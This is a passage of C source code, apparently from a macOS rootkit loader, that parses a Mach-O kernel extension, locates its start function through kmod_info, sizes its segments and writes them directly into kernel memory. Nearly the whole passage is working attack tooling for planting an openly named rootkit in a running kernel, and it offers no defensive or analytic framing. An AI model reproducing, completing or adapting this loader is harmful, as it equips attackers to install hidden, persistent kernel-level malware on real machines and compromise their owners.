        }
    }
    
    return KERN_SUCCESS;
}

/* find the rootkit entrypoint address which is start() that then loads up the real_main address
 * which is the one we define as _start in the source code
 */
static mach_vm_address_t
find_rootkit_entrypoint(uint8_t *buffer)
{
    OUTPUT_MSG("-----[ Locating rootkit entrypoint ]-----");
    
    if (buffer == NULL)
    {
        ERROR_MSG("Invalid arguments.");
        return 0;
    }
    
    struct mach_header_64 *mh = (struct mach_header_64*)buffer;
    if (mh->magic != MH_MAGIC_64)
    {
        ERROR_MSG("Rootkit is not 64 bits or invalid file!");
        return 0;
    }
    
    /* process header to find location of necessary info */
    struct load_command *lc = (struct load_command*)(buffer + sizeof(struct mach_header_64));
    
    struct symtab_command *symtab = NULL;
    
    for (uint32_t i = 0; i < mh->ncmds; i++)
    {
        /* we just need this for symbol information */
        if (lc->cmd == LC_SYMTAB)
        {
            struct symtab_command *cmd = (struct symtab_command*)lc;
            symtab = cmd;
            break;
        }
        lc = (struct load_command*)((char*)lc + lc->cmdsize);
    }
    
    if (symtab == NULL)
    {
        ERROR_MSG("No symbol information available!");
        return 0;
    }
    
    mach_vm_address_t entrypoint = 0;
    struct nlist_64 *nlist = NULL;
    for (uint32_t i = 0; i < symtab->nsyms; i++)
    {
        nlist = (struct nlist_64*)(buffer + symtab->symoff + i * sizeof(struct nlist_64));
        char *symbol_string = (char*)(buffer + symtab->stroff + nlist->n_un.n_strx);
        if ( (strcmp(symbol_string, "_kmod_info") == 0) && (nlist->n_value != 0) )
        {
            DEBUG_MSG("Found kmod_info at 0x%llx", nlist->n_value);
            /* includes say to use the compatibility structure */
            kmod_info_64_v1_t *kmod = (kmod_info_64_v1_t*)((char*)buffer + nlist->n_value);
            DEBUG_MSG("Kernel extension start function address: 0x%llx", (mach_vm_address_t)kmod->start_addr);
            entrypoint = (mach_vm_address_t)kmod->start_addr;
            break;
        }
    }
    
    return entrypoint;
}

/* return the symbol string correspondent to the symbol number
 * this is because relocations refers to the symbol number so we need to lookup the corresponding string
 */
static char *
find_symbol_by_nr(uint8_t *buffer, struct reloc_info *ri, int sym_number)
{
    if (buffer == NULL ||  ri == NULL)
    {
        ERROR_MSG("Invalid arguments.");
        return NULL;
    }
    /* make sure the request isn't out of bounds */
    if (sym_number > ri->symtab->nsyms)
    {
        ERROR_MSG("Out of bounds symbol number!");
        return NULL;
    }
    
    struct nlist_64 *nlist = NULL;
    nlist = (struct nlist_64*)((char*)buffer + ri->symtab->symoff + sym_number * sizeof(struct nlist_64));
    char *symbol_string = (char*)((char*)buffer + ri->symtab->stroff + nlist->n_un.n_strx);
    
    return symbol_string;
}

static uint32_t
get_rootkit_mem_size(const uint8_t *buffer)
{
    if (buffer == NULL)
    {
        ERROR_MSG("Invalid arguments.");
        return 0;
    }
    
    uint32_t rootkit_size = 0;
    
    struct mach_header_64 *mh = (struct mach_header_64*)buffer;
    if (mh->magic != MH_MAGIC_64)
    {
        ERROR_MSG("Rootkit is not 64 bits or invalid file!");
        return 0;
    }
    
    /* process header to compute necessary rootkit size in memory */
    struct load_command *lc = (struct load_command*)(buffer + sizeof(struct mach_header_64));
    int nr_seg_cmds = 0;
    
    for (uint32_t i = 0; i < mh->ncmds; i++)
    {
        if (lc->cmd == LC_SEGMENT_64)
        {
            struct segment_command_64 *sc = (struct segment_command_64*)lc;
            rootkit_size += sc->vmsize;
            nr_seg_cmds++;
        }
        lc = (struct load_command*)((char*)lc + lc->cmdsize);
    }
    
    DEBUG_MSG("Processed %d segment commands", nr_seg_cmds);
    return rootkit_size;
}

static kern_return_t
copy_rootkit_to_kmem(mach_vm_address_t rootkit_phys_addr, const uint8_t *buffer)
{
    OUTPUT_MSG("-----[ Copying rootkit to kernel memory ]-----");
    
    if (rootkit_phys_addr == 0 || buffer == NULL)
    {
        ERROR_MSG("Invalid arguments.");
        return KERN_FAILURE;
    }
    
    struct mach_header_64 *mh = (struct mach_header_64*)buffer;
    if (mh->magic != MH_MAGIC_64)
    {
        ERROR_MSG("Rootkit is not 64 bits or invalid file!");
        return KERN_FAILURE;
    }
    
    /* process header to compute necessary rootkit size in memory */
    struct load_command *lc = (struct load_command*)(buffer + sizeof(struct mach_header_64));
    
    if (mh->ncmds == 0 || mh->sizeofcmds == 0)
    {
        ERROR_MSG("Invalid number of commands or size.");
        return KERN_FAILURE;
    }
    
    for (uint32_t i = 0; i < mh->ncmds; i++)
    {
        /* the segment commands are the ones mapped into memory - symbol data is inside __LINKEDIT */
        if (lc->cmd == LC_SEGMENT_64)
        {
            struct segment_command_64 *sc = (struct segment_command_64*)lc;
            /* vmaddr is aligned so this is the value we want to use to position the data in the correct offset */
            mach_vm_address_t target_addr = rootkit_phys_addr + sc->vmaddr;
            /* the buffer offset positions from the file offset where data is */
            uint8_t *source_buffer = (uint8_t*)buffer + sc->fileoff;
            DEBUG_MSG("Copying segment %s to target address 0x%llx, size 0x%llx, filesize 0x%llx", sc->segname, target_addr, sc->vmsize, sc->filesize);
            /* write the data to kernel memory - size is from filesize since remainder is alignment data */
            if (writekmem(target_addr, sc->filesize, (void*)source_buffer) != KERN_SUCCESS)
            {
                ERROR_MSG("Failed to copy rootkit segment %s to kernel memory.", sc->segname);
                return KERN_FAILURE;
            }
        }
        lc = (struct load_command*)((char*)lc + lc->cmdsize);
    }
    
    return KERN_SUCCESS;
}
